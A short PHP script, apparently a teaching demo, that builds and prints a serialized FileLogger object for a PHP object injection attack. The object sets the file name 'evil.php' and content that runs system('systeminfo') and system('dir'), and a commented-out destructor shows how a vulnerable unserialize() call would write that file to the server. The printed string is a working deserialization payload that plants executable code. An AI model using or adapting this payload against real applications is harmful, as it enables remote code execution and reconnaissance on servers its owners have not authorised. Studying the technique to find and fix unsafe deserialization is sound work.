<?php
class FileLogger
{
    public $fileName = 'evil.php';
    public $serviceInformation= '<?php system(\'systeminfo\'); system(\'dir\'); ?>';
    
/*     public function testServiceStatus()
    {
           echo 'Service status is being tested. Please wait...<br>';
           $this->serviceInformation = 'Service OK';
    }
    
    public function __destruct()
    {
        // Save content of serviceInformation to dataStore.txt 
        file_put_contents(__DIR__. '/' . $this->fileName, $this->serviceInformation);
        echo 'Service information written to service information log.<br>';
    } */
}
    
// Create instance of the Logger
$logger = new FileLogger;
//echo what a serialized version of the object looks like (just for the demo)
echo htmlspecialchars(serialize($logger)); 
echo '<br>';

// Explicitly kill the object - Best Practice
$someData = null;
?>